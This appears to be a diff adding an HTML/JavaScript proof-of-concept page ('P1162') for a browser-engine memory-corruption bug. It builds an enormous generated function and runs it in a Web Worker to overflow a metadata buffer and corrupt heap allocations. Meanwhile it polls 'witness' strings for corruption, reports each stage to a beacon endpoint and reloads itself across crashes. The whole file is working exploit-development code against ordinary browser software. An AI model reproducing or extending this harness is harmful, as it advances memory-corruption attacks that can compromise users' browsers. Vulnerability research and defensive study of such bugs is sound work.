@@ -1,0 +1,186 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1162 - Sweep Corruption Observer</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c8c8d0;font:12px/1.5 'Courier New',monospace;padding:10px}
+h2{color:#00ff88;font-size:14px;margin:6px 0}
+#log{background:#12121a;border:1px solid #2a2a3a;border-radius:6px;padding:8px;margin:6px 0;
+max-height:75vh;overflow-y:auto;font-size:11px;white-space:pre-wrap;word-break:break-all}
+.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}
+.hit{color:#ff00ff;font-weight:bold}
+</style>
+</head><body>
+<h2>P1162 MetadataTable Sweep — Worker-Poll Corruption Observer</h2>
+<div id="log"></div>
+<script>
+'use strict';
+var L=document.getElementById('log'),T0=Date.now();
+function log(m,c){var d=document.createElement('div');d.className=c||'';
+d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
+function B(tag,data){try{var u='/beacon.php?tag=P1162-'+encodeURIComponent(tag);
+if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+u+='&t='+Date.now();new Image().src=u;}catch(e){}}
+window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};
+
+/* ═══════════════════════════════════════════════════════════════════════
+   P1162: observe the MetadataTable 4.29GB forward sweep corrupting
+   witness strings (community p146 architecture: worker sweeps, main
+   thread polls concurrently; beacons escape before process death).
+
+   Flow:
+   1. Main: build 171MB blob (N=44,739,243 wrap) -> blob URL.
+   2. Main: create Worker; worker importScripts(blobURL) (compiles ~8s).
+   3. Main: on 'ready', postMessage('go').
+   4. Worker: calls fn -> link() allocates 144B buffer -> finishCreation
+      sweeps forward writing 96B entries -> corrupts main-thread
+      allocations that sit in the sweep path -> SIGSEGV at unmapped.
+   5. Main: the instant 'go' is sent, allocate witness strings (many
+      sizes) REPEATEDLY while polling their .length every 100ms;
+      beacon ANY length change (corruption seen before crash).
+   Attempt budget: 5 (then idle) — crash-resume safe.
+   ═══════════════════════════════════════════════════════════════════════ */
+
+var attempt=0;
+try{attempt=parseInt(localStorage.getItem('p1162_att')||'0');}catch(e){}
+try{localStorage.setItem('p1162_att',''+(attempt+1));}catch(e){}
+B('BOOT','attempt='+attempt);
+
+if(attempt>=5){
+  B('IDLE','5 attempts done');
+  log('=== IDLE: 5 attempts complete ===','ok');
+  try{localStorage.removeItem('p1162_att');}catch(e){}
+}else{
+
+var N_TARGET=44739243;
+var CHUNK=4000000;
+var CHUNKS=Math.floor(N_TARGET/CHUNK);
+var REM=N_TARGET-CHUNKS*CHUNK;
+var witnesses=[];
+var changes=[];
+var polling=false;
+var goSent=false;
+
+/* 1. build blob */
+function buildBlob(){
+  var t0=Date.now();
+  var parts=[];
+  parts.push('self.__v141fn=function(a){');
+  for(var c=0;c<CHUNKS;c++){
+    parts.push('a();'.repeat(CHUNK));
+    if(c%4===0)B('BLD','c='+c+'|ms='+(Date.now()-t0));
+  }
+  if(REM>0)parts.push('a();'.repeat(REM));
+  parts.push('};self.postMessage({t:"compiled"});');
+  var blob=new Blob(parts,{type:'application/javascript'});
+  parts=null;
+  B('BLOB','ms='+(Date.now()-t0));
+  return URL.createObjectURL(blob);
+}
+
+/* 2. witness allocation during sweep */
+function makeWitnesses(batch){
+  var sizes=[96,192,512,1024,4096,8192];
+  for(var s=0;s<sizes.length;s++){
+    for(var k=0;k<12;k++){
+      var str='W'.repeat(sizes[s])+('x'+batch+'.'+k);
+      witnesses.push({s:str,batch:batch});
+    }
+  }
+}
+
+/* 3. polling */
+function poll(){
+  if(!polling)return;
+  var found=0;
+  for(var i=0;i<witnesses.length;i++){
+    var w=witnesses[i];
+    var len;
+    try{len=w.s.length;}catch(e){changes.push('ERR@'+i+':'+String(e.message).slice(0,20));found++;continue;}
+    if(typeof w.base==='undefined')w.base=len;
+    else if(len!==w.base){
+      changes.push('i='+i+'|base='+w.base+'|now='+len);
+      found++;
+    }
+  }
+  if(found>0){
+    B('CORRUPT','n='+found+'|'+changes.slice(-5).join(';'));
+    log('*** CORRUPTION: '+changes.slice(-5).join(' ; '),'hit');
+    polling=false;
+  }else if(witnesses.length>0&&witnesses.length%72===0){
+    B('POLL','wits='+witnesses.length+'|clean');
+  }
+  setTimeout(poll,100);
+}
+
+/* 4. worker + trigger */
+var blobUrl=buildBlob();
+var wcode='importScripts('+JSON.stringify(blobUrl)+');'+
+  'self.onmessage=function(m){if(m.data==="go"){'+
+  'try{self.__v141fn(function(){ });}'+
+  'catch(e){self.postMessage({t:"err",e:String(e)});}}};';
+var wUrl=URL.createObjectURL(new Blob([wcode],{type:'application/javascript'}));
+var worker=new Worker(wUrl);
+B('WORKER','created');
+
+/* wait for compiled message via a simple flag */
+worker.__compiled=false;
+worker.onmessage=function(m){
+  if(m.data&&m.data.t==='compiled'){worker.__compiled=true;B('WORKER-COMPILED','ok');return;}
+  if(m.data&&m.data.t==='err'){B('WORKER-ERR',String(m.data.e).slice(0,60));return;}
+};
+
+/* main flow: wait for compile (poll flag), then GO */
+var chk=setInterval(function(){
+  if(worker.__compiled&&!goSent){
+    goSent=true;
+    B('GO','worker sweep start');
+    log('=== GO: allocating witnesses during worker sweep ===','warn');
+    polling=true;
+    /* allocate witnesses for ~3s while worker sweeps */
+    var batches=0;
+    var alloc=setInterval(function(){
+      if(batches>=60){clearInterval(alloc);return;}
+      batches++;
+      makeWitnesses(batches);
+    },50);
+    worker.postMessage('go');
+    /* watchdog: if process somehow survives 15s, report */
+    setTimeout(function(){
+      B('SURVIVED','wits='+witnesses.length+'|changes='+changes.slice(-8).join(';'));
+      B('DONE','survived');
+      polling=false;
+    },15000);
+    clearInterval(chk);
+  }
+},500);
+
+/* safety: if compile never completes, report after 60s */
+setTimeout(function(){
+  if(!goSent){
+    B('TIMEOUT','worker compile never reported');
+    B('DONE','timeout');
+  }
+},60000);
+
+} /* end attempts */
+
+/* auto-reload checker */
+(function(){
+  var cur='P1162-sweep-observer';
+  setTimeout(function check(){
+    try{
+      var x=new XMLHttpRequest();
+      x.open('GET','/reload.txt?c='+Date.now(),true);
+      x.onload=function(){
+        var t=(x.responseText||'').trim();
+        if(t&&t!==cur){location.reload(true);return;}
+        setTimeout(check,3000);};
+      x.onerror=function(){setTimeout(check,5000);};
+      x.send();
+    }catch(e){setTimeout(check,5000);}
+  },4000);
+})();
+</script>
+</body></html>
